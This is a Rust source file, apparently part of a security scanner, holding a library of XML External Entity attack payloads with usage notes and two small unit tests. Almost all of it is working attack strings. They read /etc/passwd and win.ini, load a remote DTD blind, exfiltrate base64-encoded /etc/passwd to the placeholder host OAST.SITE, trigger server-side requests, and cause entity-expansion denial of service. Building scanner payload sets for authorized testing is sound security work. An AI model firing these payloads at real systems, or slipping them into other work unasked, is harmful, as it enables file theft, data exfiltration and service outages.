//! XXE seed payloads — file read + OOB exfil. The substring
//! `OAST.SITE` is a placeholder for the collaborator host.

use crate::{Payload, PayloadCategory};

const C: PayloadCategory = PayloadCategory::Xxe;

pub static PAYLOADS: &[Payload] = &[
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"hi\">]><r>&x;</r>",
        notes: "calibration probe — entity expansion echoes `hi`",
        tags: &["probe"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
        notes: "in-band file read — works when response reflects entity content",
        tags: &["file-read", "nix", "in-band"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>",
        notes: "in-band Windows file read",
        tags: &["file-read", "windows", "in-band"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % d SYSTEM \"http://OAST.SITE/x.dtd\"> %d;]><r/>",
        notes: "OOB DTD load — primary vector when XXE is blind",
        tags: &["oob", "blind"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % e SYSTEM \"http://OAST.SITE/?d=%file;\"> %e;]><r/>",
        notes: "OOB file exfil via PHP filter — base64 lands in OAST query",
        tags: &["oob", "exfil", "php"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://OAST.SITE/\">]><r>&x;</r>",
        notes: "blind SSRF via XXE — outbound HTTP from XML parser",
        tags: &["ssrf", "blind"],
    },
    Payload {
        category: C,
        value: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><r>&lol3;</r>",
        notes: "billion-laughs reduced — DoS canary; do NOT run against prod without authorization",
        tags: &["dos", "demo-only"],
    },
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_payload_is_xxe_class_and_has_doctype() {
        for p in PAYLOADS {
            assert_eq!(p.category, PayloadCategory::Xxe);
            assert!(p.value.contains("<?xml"));
        }
    }

    #[test]
    fn dos_payload_is_flagged_demo_only() {
        let dos: Vec<_> = PAYLOADS
            .iter()
            .filter(|p| p.tags.contains(&"dos"))
            .collect();
        for p in dos {
            assert!(
                p.tags.contains(&"demo-only"),
                "DOS payload must be flagged demo-only: {}",
                p.value
            );
        }
    }
}
